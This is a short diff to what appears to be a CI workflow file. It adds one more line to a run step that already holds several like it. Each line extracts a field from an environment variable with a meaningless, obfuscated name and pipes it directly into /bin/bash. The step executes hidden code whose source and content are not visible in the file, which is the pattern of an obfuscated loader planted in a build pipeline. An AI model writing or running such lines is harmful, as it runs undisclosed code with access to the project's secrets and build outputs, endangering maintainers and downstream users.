@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$a05" | jq -r .nup41 | /bin/bash
           echo $gwuno2687 | jq -r .zdr532 | /bin/bash
           printf '%s' "$de1" | jq -r .ckmk1 | /bin/bash
+          printf '%s' "$ss431" | jq -r .khn46 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
